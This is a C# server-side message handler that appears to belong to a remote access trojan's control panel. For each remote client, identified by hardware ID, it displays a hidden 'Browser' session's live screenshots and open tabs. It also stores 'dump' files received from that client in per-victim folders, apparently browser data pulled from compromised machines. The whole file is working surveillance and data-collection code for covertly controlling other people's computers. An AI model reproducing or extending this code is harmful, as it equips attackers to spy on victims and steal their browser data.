using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Server.Connectings;
using Server.Forms;
using Server.Helper;

namespace Server.Messages;

internal class HandlerBrowser
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		try
		{
			switch ((string)objects[1])
			{
			case "Connect":
			{
				string hwid = SecurityHelper.SanitizeHwid((string)objects[2]);
				int width = (int)objects[3];
				int height = (int)objects[4];
				FormBrowser form = (FormBrowser)Application.OpenForms["Browser:" + hwid];
				if (form != null)
				{
					form.Invoke((MethodInvoker)delegate
					{
						form.client = client;
						form.screen = new Size(width, height);
						form.Text = "Browser [" + hwid + "]";
						form.materialSwitch1.Enabled = true;
					});
					client.Tag = form;
					client.Hwid = hwid;
				}
				else
				{
					client.Disconnect();
				}
				break;
			}
			case "Screen":
			{
				if (client.Tag == null)
				{
					break;
				}
				FormBrowser form3 = (FormBrowser)client.Tag;
				byte[] screenData = (byte[])objects[2];
				Bitmap bitmap = Methods.ByteArrayToBitmap(screenData);
				if (bitmap == null)
				{
					break;
				}
				form3.FPS++;
				if (form3.sw.ElapsedMilliseconds >= 1000)
				{
					form3.Invoke((MethodInvoker)delegate
					{
						form3.Text = $"Browser [{client.Hwid}]  Fps[{form3.FPS}] Data[{Methods.BytesToString(screenData.Length)}] Screen[{form3.screen.Width}x{form3.screen.Height}]";
					});
					form3.FPS = 0;
					form3.sw = Stopwatch.StartNew();
				}
				form3.pictureBox1.Invoke((MethodInvoker)delegate
				{
					form3.pictureBox1.Image = bitmap;
				});
				break;
			}
			case "Tabs":
			{
				if (client.Tag == null)
				{
					break;
				}
				FormBrowser form2 = (FormBrowser)client.Tag;
				object[] titles = (object[])objects[2];
				object[] hwnds = (object[])objects[3];
				form2.Invoke((MethodInvoker)delegate
				{
					form2.rjComboBox2.Items.Clear();
					for (int i = 0; i < titles.Length; i++)
					{
						form2.rjComboBox2.Items.Add(titles[i].ToString() + " [" + hwnds[i].ToString() + "]");
					}
					if (form2.rjComboBox2.Items.Count > 0)
					{
						form2.rjComboBox2.SelectedIndex = 0;
					}
				});
				break;
			}
			case "DumpResult":
			{
				string type = objects[2].ToString();
				string fileName = SecurityHelper.SanitizeFilename(objects[3].ToString());
				byte[] data = (byte[])objects[4];
				string safeHwid = SecurityHelper.SanitizeHwid(client.Hwid);
				string savePath = Path.Combine(Application.StartupPath, "Dumps", safeHwid);
				if (!SecurityHelper.IsSafePath(Path.Combine(Application.StartupPath, "Dumps"), safeHwid))
				{
					Methods.AppendLogs(client.IP, "RCE Attack Blocked! Path Traversal (Browser)", Color.Red);
					break;
				}
				if (!Directory.Exists(savePath))
				{
					Directory.CreateDirectory(savePath);
				}
				string finalPath = Path.Combine(savePath, fileName);
				File.WriteAllBytes(finalPath, data);
				MessageBox.Show(type + " dump saved to: " + finalPath, "Dump Success", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				break;
			}
			}
		}
		catch
		{
		}
	}
}
